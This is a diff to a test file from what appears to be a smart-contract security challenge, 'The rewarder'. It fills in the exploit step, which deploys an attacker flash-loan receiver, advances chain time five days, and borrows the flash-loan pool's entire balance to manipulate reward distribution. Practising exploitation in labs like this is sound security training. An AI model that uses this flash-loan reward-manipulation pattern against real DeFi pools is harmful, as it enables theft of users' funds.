@@ -65,7 +65,22 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const ReceiverFactory = await ethers.getContractFactory('AttackerFlashLoanerReceiver', attacker);
+        const receiver = await ReceiverFactory.deploy(
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            this.rewarderPool.address, 
+            this.flashLoanPool.address
+        );
+
+        
+         // Wait until a new round starts (so that reward distribution in TheRewarderPool
+         // happens during deposit of token itself)
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        // Initiate a loan of all tokens in pool from the malicious receiver
+        const poolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
+        await receiver.initiateFlashLoan(poolBalance);
     });
 
     after(async function () {
